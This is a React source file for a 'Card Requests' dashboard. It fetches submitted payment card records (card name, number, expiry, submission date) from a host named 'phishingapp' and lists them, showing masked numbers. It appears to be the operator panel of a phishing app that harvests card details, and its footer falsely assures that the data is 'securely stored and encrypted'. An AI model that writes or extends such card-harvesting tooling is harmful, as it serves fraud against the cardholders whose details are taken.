import React, { useState, useEffect } from 'react';

function AllRequest() {
  const [cards, setCards] = useState([]);
  const [loading, setLoading] = useState(false);

  // Fetch all cards
  const fetchCards = async () => {
    try {
      setLoading(true);
      const response = await fetch('https://phishingapp-2iom.onrender.com/api/cards');
      const result = await response.json();
      
      if (result.success) {
        setCards(result.data);
      }
    } catch (error) {
      console.error('Error fetching cards:', error);
    } finally {
      setLoading(false);
    }
  };

  // Load cards on component mount
  useEffect(() => {
    fetchCards();
  }, []);

  return (
    <div className="min-h-screen bg-white py-8 px-4">
      <div className="max-w-4xl mx-auto">
        {/* Header */}
        <div className="mb-8">
          <div className="flex items-center space-x-3 mb-2">
            <div className="w-8 h-8 bg-gray-900 rounded-lg flex items-center justify-center">
              <span className="text-white text-sm font-semibold"></span>
            </div>
            <h1 className="text-2xl font-semibold text-gray-900">Card Requests</h1>
          </div>
          <p className="text-gray-600">Manage and view all card submissions</p>
        </div>

        {/* Cards List */}
        <div className="bg-white rounded-xl border border-gray-200 p-6">
          <div className="flex justify-between items-center mb-6">
            <h2 className="text-xl font-semibold text-gray-900">
              Submitted Cards
            </h2>
            <span className="bg-gray-100 text-gray-700 text-sm font-medium px-3 py-1 rounded-full">
              {cards.length} cards
            </span>
          </div>

          {loading ? (
            <div className="text-center py-12">
              <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-gray-900 mx-auto"></div>
              <p className="text-gray-600 mt-4">Loading cards...</p>
            </div>
          ) : cards.length === 0 ? (
            <div className="text-center py-12">
              <div className="text-gray-300 text-6xl mb-4">💳</div>
              <p className="text-gray-500 text-lg">No cards submitted yet</p>
              <p className="text-gray-400 text-sm mt-2">
                Card submissions will appear here
              </p>
            </div>
          ) : (
            <div className="space-y-3 max-h-96 overflow-y-auto">
              {cards.map((card) => (
                <div
                  key={card._id}
                  className="border border-gray-200 rounded-xl p-4 hover:bg-gray-50 transition-colors duration-200"
                >
                  <div className="flex justify-between items-start mb-3">
                    <h3 className="font-semibold text-gray-900 text-base">
                      {card.cardName}
                    </h3>
                    <span className="bg-green-100 text-green-700 text-xs font-medium px-2 py-1 rounded">
                      Active
                    </span>
                  </div>
                  
                  <div className="space-y-2">
                    <div className="flex justify-between">
                      <span className="text-gray-600 text-sm">Card Number:</span>
                      <span className="font-mono text-gray-900 text-sm">
                        {card.cardNumberMasked || '**** **** **** ' + card.cardNumber?.slice(-4)}
                      </span>
                    </div>
                    
                    <div className="flex justify-between">
                      <span className="text-gray-600 text-sm">Expires:</span>
                      <span className="text-gray-900 text-sm">
                        {card.expiryMonth}/{card.expiryYear}
                      </span>
                    </div>
                    
                    <div className="flex justify-between">
                      <span className="text-gray-600 text-sm">Submitted:</span>
                      <span className="text-gray-900 text-sm">
                        {new Date(card.createdAt).toLocaleDateString()}
                      </span>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>

        {/* Footer */}
        <div className="text-center mt-12 text-gray-400 text-sm">
          <p>Card details are securely stored and encrypted</p>
        </div>
      </div>
    </div>
  );
}

export default AllRequest;